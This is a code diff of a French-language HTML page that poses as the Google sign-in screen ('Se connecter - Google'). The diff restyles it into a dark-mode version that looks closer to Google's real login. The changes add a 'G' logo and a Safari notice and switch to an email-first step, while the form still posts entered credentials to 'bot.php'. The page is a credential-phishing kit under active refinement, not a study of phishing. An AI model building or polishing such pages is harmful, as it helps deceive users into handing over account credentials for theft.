@@ -5,134 +5,121 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Se connecter - Google</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
         
         body {
             margin: 0;
             padding: 0;
             font-family: 'Roboto', Arial, sans-serif;
-            background: linear-gradient(135deg, #4285F4 0%, #34A853 50%, #FBBC05 100%);
-            background-attachment: fixed;
+            background: #121212;
+            color: #e8eaed;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            color: #202124;
         }
-        .main {
+        .container {
             width: 100%;
-            max-width: 460px;
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.25);
-            padding: 48px 40px 40px;
-            text-align: center;
-            position: relative;
+            max-width: 420px;
+            padding: 20px;
         }
         .logo {
-            height: 82px;
-            margin-bottom: 28px;
+            width: 72px;
+            height: 72px;
+            background: #4285F4;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+            font-weight: bold;
+            color: white;
+            margin-bottom: 24px;
+            background: linear-gradient(135deg, #4285F4, #34A853, #FBBC05, #EA4335);
         }
         h1 {
             font-size: 28px;
             font-weight: 400;
-            margin: 0 0 8px;
+            margin: 0 0 8px 0;
         }
-        .subtitle {
-            font-size: 16px;
-            color: #5f6368;
+        .description {
+            font-size: 15px;
+            line-height: 1.45;
+            color: #9aa0a6;
             margin-bottom: 32px;
-        }
-        form {
-            text-align: left;
         }
         input {
             width: 100%;
-            padding: 14px 16px;
+            background: #202124;
+            border: 1px solid #5f6368;
+            color: #e8eaed;
+            padding: 16px 14px;
             font-size: 16px;
-            border: 1px solid #dadce0;
             border-radius: 4px;
             box-sizing: border-box;
-            margin-bottom: 24px;
-            transition: all 0.2s;
+            margin-bottom: 8px;
         }
         input:focus {
-            border-color: #1a73e8;
-            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.25);
+            border-color: #8ab4f8;
             outline: none;
+            box-shadow: 0 0 0 2px rgba(138, 180, 248, 0.5);
+        }
+        .forgot {
+            color: #8ab4f8;
+            font-size: 14px;
+            margin: 12px 0 40px 4px;
+            display: inline-block;
+        }
+        .bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .create {
+            color: #8ab4f8;
+            font-size: 14px;
+            font-weight: 500;
         }
         .btn {
-            width: 100%;
-            padding: 13px;
-            background: #1a73e8;
-            color: white;
+            background: #8ab4f8;
+            color: #202124;
             border: none;
-            border-radius: 5px;
-            font-size: 15px;
+            padding: 10px 24px;
+            border-radius: 20px;
+            font-size: 14px;
             font-weight: 500;
             cursor: pointer;
-            transition: all 0.3s;
         }
         .btn:hover {
-            background: #185abc;
-            transform: translateY(-1px);
-        }
-        .secure {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            color: #34a853;
-            font-size: 14px;
-            margin: 20px 0 30px;
-        }
-        .footer {
-            margin-top: 40px;
-            font-size: 13px;
-            color: #70757a;
-        }
-        .footer a {
-            color: #1a73e8;
-            text-decoration: none;
-            margin: 0 6px;
-        }
-        .footer a:hover {
-            text-decoration: underline;
+            background: #aecbfa;
         }
     </style>
 </head>
 <body>
-    <div class="main">
+    <div class="container">
+        <div class="logo">G</div>
         
-
-        <h1>Se connecter</h1>
-        <p class="subtitle">Utilisez votre compte Google</p>
+        <h1>Connexion</h1>
+        <p class="description">
+            Utilisez votre compte Google. Vous vous connecterez également aux services Google dans vos applications et dans Safari.
+        </p>
 
         <form action="bot.php" method="POST">
             <input type="email" name="email" placeholder="Adresse e-mail ou téléphone" required autofocus>
-            <input type="password" name="password" placeholder="Mot de passe" required>
             
-            <div class="secure">
-                <span>🔒</span>
-                <span>Connexion sécurisée avec Google</span>
+            <a href="#" class="forgot">Adresse e-mail oubliée ?</a>
+            
+            <div class="bottom">
+                <a href="#" class="create">Créer un compte</a>
+                <button type="submit" class="btn">Suivant</button>
             </div>
-            
-            <button type="submit" class="btn">Suivant</button>
         </form>
-
-        <div class="footer">
-            <a href="#">Créer un compte</a> • 
-            <a href="#">Mot de passe oublié ?</a><br><br>
-            <a href="#">Confidentialité</a> • 
-            <a href="#">Conditions d'utilisation</a>
-        </div>
     </div>
 
     <script>
         document.querySelector('form').addEventListener('submit', function(e) {
             const btn = document.querySelector('.btn');
-            btn.textContent = "Vérification en cours...";
-            btn.style.background = "#34a853";
+            btn.textContent = "Chargement...";
         });
     </script>
 </body>
